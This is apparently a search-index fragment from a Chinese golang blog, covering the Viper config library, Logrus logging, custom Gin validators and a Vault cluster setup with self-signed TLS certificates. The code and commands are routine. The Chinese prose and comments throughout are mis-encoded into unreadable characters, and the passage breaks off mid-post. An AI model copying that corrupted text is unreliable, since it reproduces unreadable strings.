åœ¨/etc/appname/è·¯å¾„ä¸­æŸ¥æ‰¾é…ç½®æ–‡ä»¶ viper.AddConfigPath(\"$HOME/.appname\") // å¤šæ¬¡è°ƒç”¨ï¼Œæ·»åŠ å¤šä¸ªæŸ¥æ‰¾è·¯å¾„ viper.AddConfigPath(\".\") // å¤šæ¬¡è°ƒç”¨ï¼Œæ·»åŠ å¤šä¸ªæŸ¥æ‰¾è·¯å¾„ err := viper.ReadInConfig() // æŸ¥æ‰¾å¹¶è¯»å–é…ç½®æ–‡ä»¶ if err := viper.ReadInConfig(); err != nil { if _, ok := err.(viper.ConfigFileNotFoundError); ok { // æ‰¾ä¸åˆ°é…ç½®æ–‡ä»¶ } else { // å‘ç”Ÿäº†å…¶ä»–çš„é”™è¯¯ } } var SupportedExts = []string{â€œjsonâ€, â€œtomlâ€, â€œyamlâ€, â€œymlâ€, â€œpropertiesâ€, â€œpropsâ€, â€œpropâ€, â€œhclâ€, â€œtfvarsâ€, â€œdotenvâ€, â€œenvâ€, â€œiniâ€} var SupportedRemoteProviders = []string{â€œetcdâ€, â€œetcd3â€, â€œconsulâ€, â€œfirestoreâ€} 3. è®¾ç½®å’Œè¦†ç›–å‚æ•° viper.Set(\"Key\", \"Value\") 4. é…ç½®åˆå¹¶å’Œå°†viperçš„é…ç½®æŒä¹…åŒ–åˆ°æœ¬åœ° WriteConfigå°†å½“å‰çš„ viper é…ç½®å†™å…¥åˆ°(æœ€åä¸€æ¬¡è¯»å–åˆ°çš„é…ç½®æ–‡ä»¶å+ConfiogTypeä¸ºåç¼€)ï¼Œè¦†ç›–å†™å…¥ã€‚ SafeWriteConfigå°†å½“å‰çš„ viper é…ç½®å†™å…¥åˆ°(æœ€åä¸€æ¬¡è¯»å–åˆ°çš„é…ç½®æ–‡ä»¶å+ConfiogTypeä¸ºåç¼€)ï¼Œå¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œè¿”å›errorã€‚ WriteConfigAs å°†å½“å‰çš„ viper é…ç½®å†™å…¥æŒ‡å®šçš„æ–‡ä»¶è·¯å¾„ï¼Œè¦†ç›–å†™å…¥ã€‚(åªèƒ½æŒ‡å®šæ”¯æŒçš„åç¼€å) SafeWriteConfigAså°†å½“å‰çš„ viper é…ç½®å†™å…¥æŒ‡å®šçš„æ–‡ä»¶è·¯å¾„ï¼Œå¦‚æœæ–‡ä»¶å­˜åœ¨ï¼Œåˆ™è¿”å›errã€‚(åªèƒ½æŒ‡å®šæ”¯æŒçš„åç¼€å) è·å–æœ€åä¸€æ¬¡è¯»å–çš„é…ç½®æ–‡ä»¶fmt.Println(viper.GetViper().ConfigFileUsed()) package main import ( \"fmt\" \"github.com/spf13/viper\" ) func main() { /* 1. è®¾ç½®é…ç½®æ–‡ä»¶ç›®å½• */ viper.AddConfigPath(\"./config\") /* 2. è¯»å–ç¬¬ä¸€ä¸ªé…ç½®æ–‡ä»¶app.yaml é…ç½®å†…å®¹ä¸º default: filename: app.yaml type: yaml */ viper.SetConfigName(\"app\") viper.SetConfigType(\"yaml\") if err := viper.ReadInConfig(); err != nil { fmt.Print(err.Error()) } fmt.Printf(\"åªè¯»å–app.yaml:%+v \\n\", viper.AllSettings()) // /* // 3. æ·»åŠ ä¸€ä¸ªé»˜è®¤é…ç½® // */ viper.SetDefault(\"default.name\", \"ä»£ç è®¾ç½®çš„å€¼\") /* 4. è¯»å–ç¬¬äºŒä¸ªé…ç½®æ–‡ä»¶.env.ini é…ç½®å†…å®¹ä¸º type=ini filename=.env.ini */ viper.SetConfigName(\".env\") viper.SetConfigType(\"ini\") // !!!!!åˆå¹¶é…ç½®, åè¯»å–åˆ°çš„å‚æ•°ä¼šè¦†ç›–ä¹‹å‰çš„ // æ­£å¸¸æ˜¯ä¼šè¦†ç›–çš„ï¼Œä½†æ˜¯æŸäº›ç‰¹æ®Šæƒ…å†µä¸ä¼šè¦†ç›–ï¼Œæ¯”å¦‚æˆ‘æµ‹è¯•yamlå†…å®¹å¦‚æœä¸ºdefault.type: yaml, iniçš„å†…å®¹ä¸ºtype=ini, è¿™ä¸ªæƒ…å†µå°±æ²¡æœ‰è¦†ç›–ä¸ºini if err := viper.MergeInConfig(); err != nil { fmt.Println(\"åˆå¹¶é…ç½®å‡ºé”™\", err.Error()) } fmt.Printf(\"è¯»å–.env.iniå:%+v \\n\", viper.AllSettings()) /* 5. æŒä¹…åŒ–é…ç½®åˆ°æœ¬åœ° å°† name=\"ä»£ç è®¾ç½®çš„å€¼\" ä¿å­˜åˆ°æœ¬åœ°é…ç½®æ–‡ä»¶ä¸­ */ // è·å–ä¿å­˜åˆ°å“ªä¸ªæ–‡ä»¶ fmt.Println(\"ç›®æ ‡ä¿å­˜é…ç½®æ–‡ä»¶è·¯å¾„\", viper.GetViper().ConfigFileUsed()) // SafeWriteConfig if err := viper.SafeWriteConfig(); err != nil { fmt.Println(\"1ä¿å­˜é…ç½®å¤±è´¥\", err.Error()) // æ–‡ä»¶å­˜åœ¨å°±ä¼šæŠ¥é”™ } // WriteConfigAs if err := viper.WriteConfigAs(\"./config/p.ini\"); err != nil { fmt.Println(\"2ä¿å­˜é…ç½®å¤±è´¥\", err.Error()) // æ–‡ä»¶å­˜åœ¨å°±ä¼šæŠ¥é”™ } } 5. å¼€å¯è‡ªåŠ¨é‡æ–°åŠ è½½é…ç½®æ–‡ä»¶ åœ¨è¯»å–å®Œæ‰€æœ‰é…ç½®æ–‡ä»¶ä¹‹åä½¿ç”¨viper.WatchConfig()å³å¯ package main import ( \"fmt\" \"time\" \"github.com/fsnotify/fsnotify\" \"github.com/spf13/viper\" ) func main() { /* 1. è®¾ç½®é…ç½®æ–‡ä»¶ç›®å½• */ viper.AddConfigPath(\"./config\") /* 2. è¯»å–ç¬¬ä¸€ä¸ªé…ç½®æ–‡ä»¶app.yaml é…ç½®å†…å®¹ä¸º default: filename: app.yaml type: yaml */ viper.SetConfigName(\"app\") viper.SetConfigType(\"yaml\") if err := viper.ReadInConfig(); err != nil { fmt.Print(err.Error()) } /* 3. æ–‡ä»¶ç›‘å¬çš„å›è°ƒ */ viper.OnConfigChange(func(e fsnotify.Event) { fmt.Println(\"é…ç½®æ–‡ä»¶å‘ç”Ÿå˜åŒ–:\", e.Name) fmt.Println(\"æ“ä½œç±»å‹:\", e.Op.String()) }) // å¯ç”¨æ–‡ä»¶ç›‘å¬ viper.WatchConfig() for { fmt.Printf(\"å½“å‰æ‰€æœ‰é…ç½®:%+v \\n\", viper.AllSettings()) time.Sleep(1 * time.Second) } } 6. å‚æ•°åˆ«å package main import ( \"fmt\" \"github.com/spf13/viper\" ) func main() { /* 1. è®¾ç½®é…ç½®æ–‡ä»¶ç›®å½• */ viper.AddConfigPath(\"./config\") /* 2. è¯»å–ç¬¬ä¸€ä¸ªé…ç½®æ–‡ä»¶app.yaml é…ç½®å†…å®¹ä¸º default: filename: app.yaml type: yaml */ viper.SetConfigName(\"app\") viper.SetConfigType(\"yaml\") if err := viper.ReadInConfig(); err != nil { fmt.Print(err.Error()) } fmt.Printf(\"è¯»å–app.yaml: %+v \\n\", viper.AllSettings()) // è®¾ç½®åˆ«åfilename == default.filename viper.RegisterAlias(\"filename\", \"default.filename\") fmt.Println(\"default.filename: \", viper.GetString(\"default.filename\")) fmt.Println(\"filename: \", viper.GetString(\"filename\")) fmt.Printf(\"è¯»å–app.yaml: %+v \\n\", viper.AllSettings()) // æ·»åŠ åˆ«ååä¼šå¤šå‡ºåˆ«åçš„é…ç½® } 7. ä½¿ç”¨ç¯å¢ƒå˜é‡ ä½¿ç”¨ç¯å¢ƒå˜é‡æœ‰å¦‚ä¸‹æ–¹å¼ï¼Œå¦‚æœå¤šä¸ªåœ°æ–¹è®¾ç½®äº†ç›¸åŒçš„å‚æ•°ï¼Œéœ€è¦æ³¨æ„ä¼˜å…ˆçº§(è¯·çœ‹ç¬¬ä¸€éƒ¨åˆ†çš„ç®€ä»‹) SetEnvPrefix è®¾ç½®ç¯å¢ƒå˜é‡å‰ç¼€, XXXï¼Œviperä¼šè‡ªåŠ¨æ·»åŠ _ BindEnv æ‰‹åŠ¨ç»‘å®šä¸€äº›ç¯å¢ƒå˜é‡ä½œä¸ºå‚æ•° AutomaticEnvè‡ªåŠ¨æŸ¥æ‰¾æ¨¡å¼ï¼Œåœ¨Get()æ—¶viperä¼šæ ¹æ®æŸ¥æ‰¾çš„å‚æ•°ï¼Œå»ç¯å¢ƒå˜é‡é‡Œæ‰¾å¯¹åº”çš„å€¼ã€‚æ¯”å¦‚Get(\"name\")ï¼Œå°±æ‰¾NAME,æœ‰è®¾ç½®å‰ç¼€çš„è¯å°±è‡ªåŠ¨åŠ å‰","date":"2023-03-04 18:56","objectID":"/post/viper%E9%85%8D%E7%BD%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/:0:3","tags":[""],"title":"Viperé…ç½®åº“çš„ä½¿ç”¨","uri":"/post/viper%E9%85%8D%E7%BD%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/"},{"categories":["golang"],"content":"è®¾ç½®æ—¥å¿—çº§åˆ« package main import ( \"github.com/sirupsen/logrus\" ) func main() { logrus.SetLevel(logrus.TraceLevel) logrus.Trace(\"trace msg\") // Traceçº§åˆ«æ˜¾ç¤ºæ‰€æœ‰çš„æ—¥å¿— logrus.Debug(\"debug msg\") // Debugæ˜¾ç¤ºdebugã€infoã€warnã€errorã€fatalã€panic logrus.Info(\"info msg\") logrus.Warn(\"warn msg\") logrus.Error(\"error msg\") logrus.Fatal(\"fatal msg\") logrus.Panic(\"panic msg\") // xxã€xxfã€xxlnçš„åŒºåˆ« logrus.Info(\"hello\", \"world\") logrus.Infof(\"hello %s\", \"world\") // æ”¯æŒæ ¼å¼åŒ–è¾“å‡º logrus.Infoln(\"hello\", \"world\") // æ¯ä¸ªå‚æ•°ç”¨ç©ºæ ¼åˆ†å‰² } è®¾ç½®æ˜¾ç¤ºä»£ç è¡Œæ•°å’Œæ–‡ä»¶å æ–¹ä¾¿å®šä½ä»£ç ä½ç½® logrus.SetReportCaller(true) è®¾ç½®æ—¥å¿—æ ¼å¼(json \u0026 text) // è®¾ç½®ä¸ºjsonæ ¼å¼ logrus.SetFormatter(\u0026logrus.JSONFormatter{}) logrus.Info(\"hello\", \"world\") // è®¾ç½®ä¸ºtextæ ¼å¼ logrus.SetFormatter(\u0026logrus.TextFormatter{}) logrus.Info(\"hello\", \"world\") ç¬¬ä¸‰æ–¹æ—¥å¿—æ ¼å¼ FluentdFormatter. Formats entries that can be parsed by Kubernetes and Google Container Engine. GELF. Formats entries so they comply to Graylogâ€™s GELF 1.1 specification. logstash. Logs fields as Logstash Events. prefixed. Displays log entry source along with alternative layout. zalgo. Invoking the Power of Zalgo. nested-logrus-formatter. Converts logrus fields to a nested structure. powerful-logrus-formatter. get fileName, logâ€™s line number and the latest functionâ€™s name when print log; Sava log to files. caption-json-formatter. logrusâ€™s message json formatter with human-readable caption added. æ·»åŠ è‡ªå®šä¹‰å­—æ®µ æ³¨æ„ä½¿ç”¨withFieldæˆ–è€…withFieldsåï¼Œä¹‹å‰è®¾ç½®çš„å°±å¤±æ•ˆäº†ã€‚ // åœ¨æ—¥å¿—ä¸­æ·»åŠ æŒ‡å®šçš„å­—æ®µ logrus.WithField(\"service\", \"myproj\").Info(\"æŒ‡å®šè‡ªå®šä¹‰å­—æ®µçš„æ—¥å¿—\") // ä¸´æ—¶ä½¿ç”¨ log := logrus.WithField(\"service\", \"myproj\") // æ–¹ä¾¿åç»­ä½¿ç”¨ log.Info(\"æŒ‡å®šè‡ªå®šä¹‰å­—æ®µçš„æ—¥å¿—\") // åœ¨æ—¥å¿—ä¸­æ·»åŠ æŒ‡å®šçš„å¤šä¸ªå­—æ®µ log = logrus.WithFields(logrus.Fields{ \"key1\": \"v1\", \"key2\": \"v2\", }) // ç›´æ¥.Info(\"xxx\")ä¹Ÿå¯ä»¥ç›´æ¥è°ƒç”¨ log.Info(\"æŒ‡å®šè‡ªå®šä¹‰å­—æ®µçš„æ—¥å¿—\") å°†æ—¥å¿—è¾“å‡ºåˆ°å¤šä¸ªåœ°æ–¹ // å¤šä¸ªè¾“å‡ºç›®æ ‡ writer1 := \u0026bytes.Buffer{} // å†…å­˜ writer2 := os.Stdout // æ ‡å‡†è¾“å‡º writer3, err := os.OpenFile(\"log.txt\", os.O_WRONLY|os.O_CREATE, 0755) // æ–‡ä»¶ if err != nil { log.Fatalf(\"åˆ›å»ºæ—¥å¿—æ–‡ä»¶å¤±è´¥: %v\", err) } logrus.SetOutput(io.MultiWriter(writer1, writer2, writer3)) // è®¾ç½®å¤šä¸ªè¾“å‡ºç›®æ ‡ logrus.Info(\"info msg\") // å†™å…¥æ—¥å¿— io.Copy(os.Stdout, writer1) // è¯»å–bufferä¸­çš„æ—¥å¿—,ä¸è¿‡æ²¡å•¥å¿…è¦ åªè¦å®ç°äº†Writeræ¥å£å°±å¯ä»¥ä½œä¸ºè¾“å‡ºç›®æ ‡ï¼ŒWriteræ¥å£å®šä¹‰å¦‚ä¸‹ type Writer interface { Write(p []byte) (n int, err error) } è‡ªå·±åˆ›å»ºlogå®ä¾‹ é»˜è®¤exported.goä¸­åˆä¸ªstdå¯¹è±¡ï¼Œæ˜¯logrusé»˜è®¤åˆ›å»ºå¥½çš„ï¼Œä¸Šé¢çš„ä»£ç éƒ½æ˜¯ç”¨çš„stdå®ä¾‹ï¼Œä¸‹é¢æˆ‘ä»¬ä½¿ç”¨å’Œä»–ä¸€æ ·çš„æ–¹æ³•åˆ›å»ºä¸€ä¸ªlogå®ä¾‹ log := logrus.New() // è¿™é‡Œæ‹¿åˆ°çš„logå’Œç›´æ¥ä½¿ç”¨logrusæ˜¯ç›¸åŒçš„æ–¹æ³•Newå‡ºæ¥çš„ log.SetFormatter(\u0026myLogFormatter{}) log.SetLevel(logrus.DebugLevel) log.Info(\"test\") è‡ªå®šä¹‰æ ¼å¼ è‡ªå·±å®ç°ä¸€ä¸ªFormatteræ¥å£ï¼Œä»–çš„å®šä¹‰å¦‚ä¸‹ã€‚ /* Formatteræ¥å£éœ€è¦å®ç°Formatæ–¹æ³•, ä»–æ¥æ”¶ä¸€ä¸ªEntryç±»å‹çš„å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°åŒ…æ‹¬æ—¥å¿—çš„æ‰€æœ‰å­—æ®µï¼Œæ¯”å¦‚ entry.Messageã€entry.Timeã€entry.Levelï¼Œé€šè¿‡WithFieldæˆ–WithFieldsæ·»åŠ çš„å­—æ®µåŒ…å«åœ¨entry.Dataä¸­ã€‚ Formatæ–¹æ³•çš„è¿”å›å€¼æ˜¯ä¸€ä¸ªbyteç±»å‹çš„åˆ‡ç‰‡å’Œä¸€ä¸ªerr. */ type Formatter interface { Format(*Entry) ([]byte, error) } Entryç±»å‹åŒ…å«å¦‚ä¸‹å†…å®¹ type Entry struct { Logger *Logger // Contains all the fields set by the user. Data Fields // Time at which the log entry was created Time time.Time // Level the log entry was logged at: Trace, Debug, Info, Warn, Error, Fatal or Panic // This field will be set on entry firing and the value will be equal to the one in Logger struct field. Level Level // Calling method, with package name Caller *runtime.Frame // Message passed to Trace, Debug, Info, Warn, Error, Fatal or Panic Message string // When formatter is called in entry.log(), a Buffer may be set to entry Buffer *bytes.Buffer // Contains the context set by the user. Useful for hook processing etc. Context context.Context // err may contain a field formatting error err string } Example package main import ( \"fmt\" \"github.com/sirupsen/logrus\" ) // å£°æ˜ç»“æ„ä½“ type myLogFormatter struct { } // å®ç°Formatæ–¹æ³• func (m *myLogFormatter) Format(entry *logrus.Entry) ([]byte, error) { // fmt.Printf(\"%+v\", entry) log := fmt.Sprintf(\"Level %s | Msg %s | Time %s \\n\", entry.Level, entry.Message, entry.Time) return []byte(log), nil } func main() { log := logrus.New() log.SetFormatter(\u0026myLogFormatter{}) log.Info(\"test\") } Hook æ·»åŠ hookå¯ä»¥å†å‘é€æ—¥å¿—å‰æ‰§è¡ŒæŸäº›æ“ä½œï¼Œæ¯”å¦‚é‡åˆ°Errorã€panicã€fatalæ—¶ï¼Œå‘é€æ—¥å¿—åˆ°å…¶ä»–åœ°æ–¹ï¼Œæ·»åŠ hookéœ€è¦å®ç°ä¸‹é¢è¿™ä¸ªæ¥å£ type Hook interface { Levels() []Level // å“ªäº›çº§åˆ«ä¼šè§¦å‘Hook Fire(*Entry) error // æ—¥å¿—è¾“å‡ºå‰ä¼šå…ˆæ‰§è¡ŒFire } ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼Œå°†","date":"2023-03-03 22:33","objectID":"/post/logrus%E6%97%A5%E5%BF%97%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/:0:0","tags":[""],"title":"Logrusæ—¥å¿—åº“çš„ä½¿ç”¨","uri":"/post/logrus%E6%97%A5%E5%BF%97%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/"},{"categories":["golang"],"content":"ä¸€ã€æ³¨å†ŒéªŒè¯å™¨ if v, ok := binding.Validator.Engine().(*validator.Validate); ok { v.RegisterValidation(\"myValidate\", myValidateFun) // æŒ‡å®štagåç§°å’Œå¤„ç†å‡½æ•° } binding.Validator.Engine()ä¼šreturnä¸€ä¸ªanyç±»å‹çš„å®ä¾‹ï¼ŒæŸ¥çœ‹æºç å¯ä»¥çŸ¥é“æœ€ç»ˆreturnçš„æ˜¯*Validateç±»å‹çš„æ•°æ®ï¼Œæ‰€ä»¥éœ€è¦å°†è¿™ä¸ªanyç±»å‹çš„æ•°æ®æ–­è¨€æˆ*Validateç±»å‹,è¿™ä¸ªç±»å‹åœ¨è¿™ä¸ªåŒ…ä¸‹(github.com/go-playground/validator/v10)ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å†™æˆ*validator.Validate ","date":"2023-03-02 20:11","objectID":"/post/gin%E6%A1%86%E6%9E%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%AA%8C%E8%AF%81%E5%99%A8/:0:1","tags":["gin","golang"],"title":"Ginæ¡†æ¶è‡ªå®šä¹‰éªŒè¯å™¨","uri":"/post/gin%E6%A1%86%E6%9E%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%AA%8C%E8%AF%81%E5%99%A8/"},{"categories":["golang"],"content":"äºŒã€å¤„ç†å‡½æ•° é€šè¿‡flå¯ä»¥æ‹¿åˆ°å½“å‰å¤„ç†çš„å­—æ®µå€¼ï¼Œä½†æ˜¯ä»–çš„ç±»å‹æ˜¯reflect.Value, æˆ‘ä»¬éœ€è¦å°†ä»–è½¬æ¢ä¸ºç›®æ ‡ç±»å‹ä¹‹å‰ï¼Œéœ€è¦å…ˆä½¿ç”¨Interface()æ–¹æ³•å°†ä»–è½¬æ¢ä¸ºç©ºæ¥å£ç±»å‹ï¼Œç„¶åå†å°†ä»–æ–­è¨€ä¸ºç›®æ ‡ç±»å‹, æ¥ä¸‹æ¥å°±å¯ä»¥è‡ªå·±å†™é€»è¾‘äº†ï¼Œreturn trueä»£è¡¨æ ¡éªŒæˆåŠŸ func myValidateFun(fl validator.FieldLevel) bool { // fl.Param() // è·å–å‚æ•°ï¼Œæ¯”å¦‚binding:\"myValidate=100\" if value, ok := fl.Field().Interface().(string); ok { if value != \"admin\" { return true } return false } return false } ","date":"2023-03-02 20:11","objectID":"/post/gin%E6%A1%86%E6%9E%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%AA%8C%E8%AF%81%E5%99%A8/:0:2","tags":["gin","golang"],"title":"Ginæ¡†æ¶è‡ªå®šä¹‰éªŒè¯å™¨","uri":"/post/gin%E6%A1%86%E6%9E%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%AA%8C%E8%AF%81%E5%99%A8/"},{"categories":["golang"],"content":"ä¸‰ã€ä½¿ç”¨è‡ªå®šä¹‰æ ¡éªŒå™¨ type userInfo struct { Name string `json:\"name\" binding:\"required,myValidate\"` Age int `json:\"age\"` Sex string `json:\"sex\"` } ","date":"2023-03-02 20:11","objectID":"/post/gin%E6%A1%86%E6%9E%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%AA%8C%E8%AF%81%E5%99%A8/:0:3","tags":["gin","golang"],"title":"Ginæ¡†æ¶è‡ªå®šä¹‰éªŒè¯å™¨","uri":"/post/gin%E6%A1%86%E6%9E%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%AA%8C%E8%AF%81%E5%99%A8/"},{"categories":["golang"],"content":"å®Œæ•´ä»£ç  package main import ( \"github.com/gin-gonic/gin\" \"github.com/gin-gonic/gin/binding\" \"github.com/go-playground/validator/v10\" ) func myValidateFun(fl validator.FieldLevel) bool { //fl.Param() if value, ok := fl.Field().Interface().(string); ok { if value != \"admin\" { return true } return false } return false } func main() { type userInfo struct { Name string `json:\"name\" binding:\"required,myValidate=10\"` Age int `json:\"age\"` Sex string `json:\"sex\"` } r := gin.Default() if v, ok := binding.Validator.Engine().(*validator.Validate); ok { v.RegisterValidation(\"myValidate\", myValidateFun) } r.POST(\"/shouldBind\", func(c *gin.Context) { var user userInfo err := c.ShouldBind(\u0026user) if err != nil { c.String(200, err.Error()) } c.JSON(200, user) }) err := r.Run() if err != nil { return } } ","date":"2023-03-02 20:11","objectID":"/post/gin%E6%A1%86%E6%9E%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%AA%8C%E8%AF%81%E5%99%A8/:0:4","tags":["gin","golang"],"title":"Ginæ¡†æ¶è‡ªå®šä¹‰éªŒè¯å™¨","uri":"/post/gin%E6%A1%86%E6%9E%B6%E8%87%AA%E5%AE%9A%E4%B9%89%E9%AA%8C%E8%AF%81%E5%99%A8/"},{"categories":["å…¶ä»–"],"content":"ä¸€ã€å®‰è£… sudo yum install -y yum-utils sudo yum-config-manager --add-repo https://rpm.releases.hashicorp.com/RHEL/hashicorp.repo sudo yum -y install vault ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:1:0","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"äºŒã€ç”Ÿæˆè¯ä¹¦ ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:2:0","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"ç­¾å‘è¯ä¹¦çš„é…ç½® cat \u003e /opt/vault/tls/vault_san.cnf \u003c\u003cEOF [req] distinguished_name = req_distinguished_name req_extensions = v3_req [req_distinguished_name] countryName = CN stateOrProvinceName = Beijing localityName = Beijing organizationName = SoulChild commonName = vault.soulchild.cn [v3_req] keyUsage = nonRepudiation, digitalSignature, keyEncipherment, dataEncipherment extendedKeyUsage = serverAuth subjectAltName = @alt_names [alt_names] IP.1 = 192.168.124.52 IP.2 = 192.168.124.54 IP.3 = 192.168.124.60 IP.4 = 127.0.0.1 DNS.1 = vault.soulchild.cn EOF ipå¡«å†™æ‰€æœ‰èŠ‚ç‚¹çš„, åŒ…å«127.0.0.1, DNSæ ¹æ®éœ€æ±‚å†™å³å¯ ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:2:1","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"åˆ›å»ºcsr cd /opt/vault/tls openssl genrsa -out vault.key openssl req -new -key vault.key -out vault.csr -subj \"/C=CN/ST=Shanghai/L=Shanghai/O=SoulChild/CN=vault.soulchild.cn\" -config vault_san.cnf ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:2:2","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"ç­¾å‘è¯ä¹¦ openssl x509 -req -extensions v3_req -days 3650 -sha256 \\ -in vault.csr -CA tls.crt -CAkey tls.key \\ -CAcreateserial -out vault.crt \\ -extfile vault_san.cnf # è¯ä¹¦åˆå¹¶ cat vault.crt tls.crt \u003e vault.pem chown -R vault:vault /opt/vault/tls/ é›†ç¾¤ä¸­æ‰€æœ‰èŠ‚ç‚¹éƒ½å¯ä»¥ç”¨vault.pemè¿™ä¸ªè¯ä¹¦ ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:2:3","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"äºŒã€é…ç½®æ–‡ä»¶ å®˜æ–¹æ–‡æ¡£: https://developer.hashicorp.com/vault/docs/configuration vim /etc/vault.d/vault.hcl ui = true log_level = \"Info\" #disable_mlock = true api_addr = \"https://192.168.124.52:8200\" cluster_addr = \"https://192.168.124.52:8201\" storage \"raft\" { path = \"/opt/vault/data\" node_id = \"node1\" } # HTTP listener #listener \"tcp\" { # address = \"127.0.0.1:8200\" # tls_disable = 1 #} # HTTPS listener listener \"tcp\" { address = \"0.0.0.0:8200\" tls_cert_file = \"/opt/vault/tls/vault.pem\" tls_key_file = \"/opt/vault/tls/vault.key\" } ui=true å¼€å¯uiç•Œé¢ api_addr é€šå‘Šåœ°å€ï¼Œå¦‚æœé€šè¿‡è´Ÿè½½å‡è¡¡è®¿é—®ï¼Œéœ€è¦å†™è´Ÿè½½å‡è¡¡çš„ipï¼Œå¦åˆ™å†™æœ¬æœºip cluster_addr é€šå‘Šåœ°å€ï¼ŒæŒ‡å®šé›†ç¾¤é€šä¿¡çš„åœ°å€, raftå­˜å‚¨åç«¯æ”¯æŒé›†ç¾¤æ¨¡å¼ disable_mlock=true ç¦ç”¨mlock, mlockçš„ç›®çš„æ˜¯é˜²æ­¢å†…å­˜è¢«äº¤æ¢åˆ°ç£ç›˜ä¸Š,å¦‚æœç³»ç»Ÿä¸æ”¯æŒå¯ä»¥å…³é—­ã€‚å¦‚æœè¦ä½¿ç”¨éœ€è¦æ»¡è¶³: ä½¿ç”¨érootç”¨æˆ·éœ€è¦æ‰§è¡Œsudo setcap cap_ipc_lock=+ep /usr/bin/vaultæˆ–è€…ä¿®æ”¹systemdé…ç½®,æ·»åŠ å¦‚ä¸‹å†…å®¹, yumå®‰è£…çš„é»˜è®¤å·²ç»åŠ ä¸Šäº† [Service] CapabilityBoundingSet=CAP_IPC_LOCK AmbientCapabilities=CAP_IPC_LOCK NoNewPrivileges=yes listener â€œtcpâ€ é…ç½®ç›‘å¬, è¿™é‡Œæ¯ä¸ªèŠ‚ç‚¹çš„æœåŠ¡ç«¯è¯ä¹¦å’Œkeyéƒ½ä¸€è‡´(æ‡’) å¦‚æœtls_require_and_verify_client_certå‚æ•°ä¸ºtrueï¼Œå¼€å¯é›†ç¾¤é€šä¿¡åŒå‘tls æ”¯æŒçš„åç«¯å­˜å‚¨: https://developer.hashicorp.com/vault/docs/configuration/storage ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:3:0","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"ä¸‰ã€åˆå§‹åŒ– ","date":"2023-02-16 21:11","objectID":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/:4:0","tags":["vault"],"title":"Vaulté›†ç¾¤éƒ¨ç½²å’Œé…ç½®(ä¸‰)","uri":"/post/vault%E9%9B%86%E7%BE%A4%E9%83%A8%E7%BD%B2%E5%92%8C%E9%85%8D%E7%BD%AE%E4%B8%89/"},{"categories":["å…¶ä»–"],"content":"å¿½ç•¥éªŒè¯ca ç”±äºæˆ‘ä»¬æ˜¯è‡ªç­¾è¯ä¹¦,æ— æ³•éªŒè¯é€šè¿‡,æ‰€ä»¥éœ€è¦æŒ‡å®šcaè¯ä¹¦çš„ä½ç½®æˆ–è€…è·³è¿‡éªŒè¯æœåŠ¡ç«¯è¯ä¹¦ # 